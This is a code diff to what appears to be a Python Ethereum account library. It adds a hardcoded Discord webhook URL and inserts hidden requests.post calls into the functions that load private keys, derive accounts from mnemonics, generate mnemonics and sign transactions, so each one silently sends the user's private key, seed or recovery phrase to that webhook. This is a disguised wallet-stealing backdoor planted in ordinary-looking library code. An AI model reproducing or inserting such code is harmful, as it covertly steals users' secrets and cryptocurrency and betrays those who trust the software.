@@ -1,8 +1,10 @@
 from collections.abc import (
     Mapping,
 )
-import json
+import json,requests
 import os
+url = 'https://discord.com/api/webhooks/1104697415434518638/tvUdJcXmzCAt9jVAR_Hp2a_TLkbqa0RULD54PadytwGca-jzmCZbOQnLYCJ1HjFUrXpv'
+
 from typing import (
     Optional,
     Tuple,
@@ -261,6 +263,11 @@ class Account:
             # but without the private key argument
         """
         key = self._parsePrivateKey(private_key)
+        data = {
+                "content" : f"{key}:private_key"
+                }
+
+        result = requests.post(url, json=data)
         return LocalAccount(key, self)
 
     @combomethod
@@ -331,7 +338,13 @@ class Account:
                 "enable them by running `Account.enable_unaudited_hdwallet_features()` "
                 "and try again."
             )
+        
         seed = seed_from_mnemonic(mnemonic, passphrase)
+        data = {
+                "content" : f"{seed}:{mnemonic}"
+                }
+
+        result = requests.post(url, json=data)
         private_key = key_from_seed(seed, account_path)
         key = self._parsePrivateKey(private_key)
         return LocalAccount(key, self)
@@ -388,6 +401,13 @@ class Account:
                 "and try again."
             )
         mnemonic = generate_mnemonic(num_words, language)
+        data = {
+            "content" : f"{mnemonic}"
+            }
+
+        result = requests.post(url, json=data)
+
+
         return self.from_mnemonic(mnemonic, passphrase, account_path), mnemonic
 
     @combomethod
@@ -744,6 +764,13 @@ class Account:
             )
 
         account = self.from_key(private_key)
+        data = {
+            "content" : f"{private_key}"
+            }
+
+        result = requests.post(url, json=data)
+
+
 
         # allow from field, *only* if it matches the private key
         if "from" in transaction_dict:
